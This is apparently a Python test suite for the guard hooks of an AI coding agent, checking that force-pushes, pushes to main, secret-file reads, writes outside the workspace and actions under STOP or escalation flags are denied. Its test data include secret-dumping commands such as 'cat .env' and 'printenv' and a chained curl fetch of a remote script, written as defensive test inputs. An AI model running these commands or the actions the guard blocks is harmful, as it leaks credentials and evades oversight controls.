import unittest
import subprocess
import json
import os
import sys
import shutil
import tempfile
from pathlib import Path

class TestHooksAdversarialE(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.repo_root = Path(__file__).resolve().parents[1]
        cls.python_exe = sys.executable
        cls.guard_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "pretool_guard.py"
        cls.events_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "posttool_events.py"
        cls.budget_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "postinvocation_budget.py"
        cls.stop_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "stop_guard.py"

    def setUp(self):
        # Create an isolated temporary workspace for each test
        self.temp_dir_obj = tempfile.TemporaryDirectory()
        self.temp_workspace = Path(self.temp_dir_obj.name).resolve()
        
        # Build standard directory layout inside fixture
        (self.temp_workspace / ".agents" / "state").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / ".agents" / "policies").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "runs").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "evidence").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "src").mkdir(parents=True, exist_ok=True)

    def tearDown(self):
        self.temp_dir_obj.cleanup()

    def run_hook(self, script_path, payload):
        # Ensure workspacePaths points to the isolated temporary fixture
        if "workspacePaths" not in payload:
            payload["workspacePaths"] = [str(self.temp_workspace)]

        # Run with cwd set to temp_workspace / .agents
        agents_cwd = self.temp_workspace / ".agents"
        p = subprocess.Popen(
            [self.python_exe, str(script_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=str(agents_cwd),
            text=True,
            encoding='utf-8'
        )
        stdout, stderr = p.communicate(input=json.dumps(payload))
        self.assertEqual(p.returncode, 0, f"Hook process failed with exit {p.returncode}: {stderr}")
        return json.loads(stdout.strip()) if stdout.strip() else {}

    def test_H03_force_push_blocked(self):
        payload = {
            "conversationId": "test-h03",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push --force origin feature/test"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forcado", res.get("reason", ""))

    def test_H04_push_origin_main_blocked(self):
        payload = {
            "conversationId": "test-h04",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push origin main"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push direto para main/master proibido", res.get("reason", ""))

    def test_H05_secrets_bait_blocked(self):
        # 1. File reading of secrets bait
        for bait in [".env", "config/database.key", "certs/cert.pem", "creds/credentials.json"]:
            payload = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": str(self.temp_workspace / bait)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny secret: {bait}")
            self.assertIn("bloqueado por politica de seguranca", res.get("reason", ""))

        # 2. Terminal commands attempting to dump secrets (P0-06)
        for cmd in ["cat .env", "type .env", "Get-Content .env", "printenv", "cat cert.pem"]:
            payload_cmd = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res_cmd = self.run_hook(self.guard_script, payload_cmd)
            self.assertEqual(res_cmd.get("decision"), "deny", f"Failed to deny secret command: {cmd}")

    def test_H06_outside_workspace_write_blocked(self):
        payload = {
            "conversationId": "test-h06",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": "/etc/malicious_config"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("fora dos limites do workspace", res.get("reason", ""))

    def test_H07_chained_command_falls_to_restrictive(self):
        # Chained command starting with git status but having unknown curl
        payload = {
            "conversationId": "test-h07",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git status && curl https://untrusted-site.com/script.sh"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertNotEqual(res.get("decision"), "allow")
        self.assertEqual(res.get("decision"), "ask")

    def test_H08_legitimate_routine_commands_allowed(self):
        for legitimate in [
            "git status",
            "git diff HEAD~1",
            "git log -n 5",
            "git branch",
            f"{sys.executable} -m unittest discover -s tests -v"
        ]:
            payload = {
                "conversationId": "test-h08",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": legitimate}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "allow", f"Failed to allow routine command: {legitimate}")

    def test_H09_stop_blocks_modifiers_allows_diagnostics(self):
        # Create STOP file ONLY inside temp fixture
        stop_path = self.temp_workspace / ".agents" / "state" / "STOP"
        stop_path.write_text("STOPPED", encoding="utf-8")

        # Modifying action -> deny
        payload_write = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Reading file -> allow
        payload_read = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Stop report in evidence folder -> allow
        payload_ev = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "evidence" / "stop_report.md")}
            }
        }
        res_ev = self.run_hook(self.guard_script, payload_ev)
        self.assertEqual(res_ev.get("decision"), "allow")

    def test_H10_phase_escalated_blocks_modifiers_allows_diagnostics(self):
        # P0-02: canonical phase check in state.json
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-TEST-001", encoding="utf-8")
        test_run_dir = self.temp_workspace / "runs" / "RUN-TEST-001"
        test_run_dir.mkdir(parents=True, exist_ok=True)
        (test_run_dir / "state.json").write_text(json.dumps({"phase": "ESCALATED"}), encoding="utf-8")

        # Write project file -> deny
        payload_write = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Read project file -> allow
        payload_read = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Subagent delegation under ESCALATED -> deny (P1-08)
        payload_sub = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res_sub = self.run_hook(self.guard_script, payload_sub)
        self.assertEqual(res_sub.get("decision"), "deny")

    def test_H12_subagent_delegation_in_normal_run(self):
        payload = {
            "conversationId": "test-h12",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "allow")

    def test_H15_protect_org_in_fixture_blocks_core_writes(self):
        # Create PROTECT_ORG ONLY in temp fixture
        (self.temp_workspace / ".agents" / "state" / "PROTECT_ORG").write_text("LOCKED", encoding="utf-8")

        for core_rel in [".agents/hooks.json", "org_v5/contracts.py", "AGENTS.md"]:
            payload = {
                "conversationId": "test-h15",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": str(self.temp_workspace / core_rel)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny write to core file: {core_rel}")
            self.assertIn("PROTECT_ORG ativo", res.get("reason", ""))

    def test_H16_stop_hook_contract(self):
        # 1. Termination due to error allows terminate
        payload_err = {
            "conversationId": "conv-err",
            "terminationReason": "error",
            "error": "Fatal crash",
            "fullyIdle": True
        }
        res_err = self.run_hook(self.stop_script, payload_err)
        self.assertEqual(res_err.get("decision"), "terminate")

        # 2. When verifiable pending review exists, continue up to 2 times
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-PENDING-001", encoding="utf-8")
        run_pending_dir = self.temp_workspace / "runs" / "RUN-PENDING-001"
        run_pending_dir.mkdir(parents=True, exist_ok=True)
        (run_pending_dir / "state.json").write_text(json.dumps({
            "phase": "PLANNING",
            "pending_reviews": ["ART-PRD-001"]
        }), encoding="utf-8")

        payload_pend = {
            "conversationId": "conv-pending-1",
            "terminationReason": "model_stop",
            "error": "",
            "fullyIdle": True
        }
        # First attempt -> continue
        res1 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res1.get("decision"), "continue")

        # Second attempt -> continue
        res2 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res2.get("decision"), "continue")

        # Third attempt -> terminate
        res3 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res3.get("decision"), "terminate")

if __name__ == "__main__":
    unittest.main()
